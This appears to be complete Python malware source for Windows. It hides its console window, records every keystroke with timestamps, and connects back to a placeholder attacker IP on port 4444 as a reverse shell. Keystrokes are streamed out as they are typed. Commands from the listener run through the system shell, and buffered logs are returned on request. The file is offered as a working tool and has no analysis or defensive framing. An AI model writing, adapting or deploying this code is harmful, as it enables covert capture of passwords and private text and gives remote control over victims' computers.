import keyboard
import socket
import subprocess
import threading
import time
import ctypes
from datetime import datetime

# Hide console window using ctypes
def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)  # SW_HIDE = 0
    except:
        pass

# Configuration
TIMESTAMP_FORMAT = "%Y-%m-%d %H:%M:%S"
LISTENER_IP = "x.x.x.x"  # Attackers IP
LISTENER_PORT = 4444
RECONNECT_INTERVAL = 10  # Seconds between reconnection attempts

# Global variables
global_socket = None
keylog_buffer = []  
buffer_lock = threading.Lock()  # Lock for thread-safe buffer access

# Keylogger function
def keylogger():
    global global_socket, keylog_buffer
    def on_key_press(event):
        try:
            key = event.name
            if len(key) > 1:
                key = " " if key == "space" else "[ENTER]" if key == "enter" else "[BACKSPACE]" if key == "backspace" else f"[{key.upper()}]"
            timestamp = datetime.now().strftime(TIMESTAMP_FORMAT)
            log_entry = f"[{timestamp}] {key}"
            with buffer_lock:
                keylog_buffer.append(log_entry)
            if global_socket:
                global_socket.send(f"KEYSTROKE: {log_entry}\n".encode())
                global_socket.send(b'')  # Force flush
        except:
            pass

    keyboard.on_press(on_key_press)
    keyboard.wait()

# Reverse shell function
def reverse_shell():
    global global_socket, keylog_buffer
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((LISTENER_IP, LISTENER_PORT))
            s.send(b"[*] Connected from Windows\n")
            global_socket = s

            while True:
                command = s.recv(1024).decode().strip()
                if command.lower() == "exit":
                    break
                elif command.lower() == "get_logs":
                    try:
                        with buffer_lock:
                            logs = "\n".join(f"LOG: {log}" for log in keylog_buffer) if keylog_buffer else "No logs yet"
                        s.send(f"[*] Logs:\n{logs}\n".encode())
                        s.send(b'')  # Force flush
                    except Exception as e:
                        s.send(f"[*] Error reading logs: {e}\n".encode())
                else:
                    try:
                        if command.lower() == "ls":
                            command = "dir"
                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                        s.send(result)
                        s.send(b'')  # Force flush
                    except Exception as e:
                        s.send(f"[*] Error: {e}\n".encode())
            s.close()
            global_socket = None
            break
        except Exception:
            time.sleep(RECONNECT_INTERVAL)

def main():
    hide_console()
    keylogger_thread = threading.Thread(target=keylogger, daemon=True)
    keylogger_thread.start()
    reverse_shell()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        keyboard.unhook_all()